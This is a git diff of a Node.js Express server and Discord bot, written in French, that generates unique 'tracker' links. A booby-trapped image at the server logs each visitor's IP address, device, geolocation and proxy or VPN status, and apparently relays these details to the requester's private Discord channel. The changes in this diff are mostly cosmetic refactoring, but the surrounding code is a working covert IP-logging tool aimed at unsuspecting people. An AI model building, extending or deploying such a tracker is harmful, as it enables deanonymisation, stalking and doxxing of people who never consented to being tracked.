@@ -17,7 +17,7 @@ const BUTTON_CHANNEL_NAME = "📎・génère-lien-tracker";
 const PRIVATE_CHANNEL_NAME = "🔍・suivi-en-direct";
 const CLIENTS_FILE = './clients.json';
 
-// 📡 EXPRESS SERVER
+// EXPRESS SERVER
 const app = express();
 app.use(cors());
 const deviceDetector = new DeviceDetector();
@@ -36,7 +36,9 @@ app.get('/image.jpg', async (req, res) => {
   const userAgent = req.headers['user-agent'];
   const device = deviceDetector.parse(userAgent);
 
-  let log = `📸 **Image piégée ouverte !**\nIP : ${ip}\nAppareil : ${device.client?.name || 'Inconnu'} - ${device.os?.name || 'Inconnu'}\n`;
+  let log = `📸 **Image piégée ouverte !**\n`;
+  log += `IP : ${ip}\n`;
+  log += `Appareil : ${device.client?.name || 'Inconnu'} - ${device.os?.name || 'Inconnu'}\n`;
 
   try {
     const geo = lookup.get(ip);
@@ -55,7 +57,9 @@ app.get('/image.jpg', async (req, res) => {
     if (geo?.traits?.is_satellite_provider) proxyFlags.push("🛰️ Satellite");
     if (geo?.traits?.is_legitimate_proxy) proxyFlags.push("🧪 Proxy déclaré");
 
-    log += proxyFlags.length > 0 ? `⚠️ Réseau suspect :\n- ${proxyFlags.join('\n- ')}\n` : `✅ Connexion légitime\n`;
+    log += proxyFlags.length > 0
+      ? `⚠️ Réseau suspect :\n- ${proxyFlags.join('\n- ')}\n`
+      : `✅ Connexion légitime\n`;
 
   } catch (err) {
     log += `❌ Erreur de géolocalisation : ${err.message}`;
@@ -80,7 +84,7 @@ app.get('/image.jpg', async (req, res) => {
       }
     }
   } catch (err) {
-    console.log("❌ Erreur Discord :", err.message);
+    console.log("❌ Erreur Discord log :", err.message);
   }
 
   res.status(204).send();
@@ -90,7 +94,7 @@ app.listen(port, () => {
   console.log(`🛰️ Serveur Express actif sur le port ${port}`);
 });
 
-// 🤖 DISCORD BOT
+// DISCORD BOT
 const client = new Client({
   intents: [GatewayIntentBits.Guilds, GatewayIntentBits.GuildMessages, GatewayIntentBits.MessageContent],
   partials: [Partials.Channel]
@@ -149,8 +153,9 @@ client.on(Events.InteractionCreate, async interaction => {
     const uniqueId = `${user.id}_${crypto.randomBytes(3).toString("hex")}`;
     const trackerUrl = `${TRACKER_BASE_URL}${uniqueId}`;
 
+    // ✅ On envoie uniquement le lien, pas les logs tout de suite
     await privateChannel.send({
-      content: `🎯 Voici ton lien tracker unique :\n${trackerUrl}`
+      content: `🎯 Voici ton lien tracker unique :\n${trackerUrl}\n\n🕵️‍♂️ Les connexions détectées à ce lien s'afficheront ici automatiquement.`
     });
 
     let clients = {};
@@ -161,7 +166,9 @@ client.on(Events.InteractionCreate, async interaction => {
     clients[uniqueId] = privateChannel.id;
     fs.writeFileSync(CLIENTS_FILE, JSON.stringify(clients, null, 2));
 
-    await interaction.editReply({ content: `✅ Ton lien unique a été généré ici : <#${privateChannel.id}>` });
+    await interaction.editReply({
+      content: `✅ Ton lien unique a été généré ici : <#${privateChannel.id}>`
+    });
 
   } catch (err) {
     console.error("❌ Erreur interaction :", err);
